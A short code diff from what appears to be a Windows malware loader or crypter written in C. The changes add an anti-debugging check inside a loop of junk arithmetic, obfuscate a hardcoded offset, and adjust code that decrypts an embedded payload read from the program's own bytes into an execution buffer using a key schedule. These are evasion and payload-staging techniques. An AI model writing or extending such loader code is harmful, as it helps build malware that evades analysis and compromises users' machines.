@@ -115,6 +115,7 @@ DWORD WINAPI setupWinApi(){
     int y = 187;
     while (mutex_setupWinApi != 1){
         x = y * x & 4 % 6;
+        CHECK_DBG;
         y = x * x;
     }
     _SetThreadDesktop(desktop);
@@ -144,6 +145,8 @@ int pseudo_main(){
     int sz = 0;
     payload p;
     DWORD threadId;
+    #ifndef DEBUG
+    #endif
     HANDLE threadHandle;
     unsigned char KeyList[176];
     DWORD junk[sizeof(PDWORD)];
@@ -245,8 +248,8 @@ int pseudo_main(){
     SHORT_JMP
     #endif
     KeyScheduler(MasterKeyPayload, KeyList);
-    unsigned char* payload_ptr = (unsigned char*) pseudo_main + 34;
-    // FIXME Payload size hardcoded
+    unsigned char* payload_ptr = (unsigned char*) pseudo_main + (0x53 - 0x26);
+    // FIXME Payload offset hardcoded
     for (int i = 0, bi = 0; i < PAYLOAD_LEN/4*7;){
         i += 3;
         memcpy(exec_macro + bi, payload_ptr + i, 4);
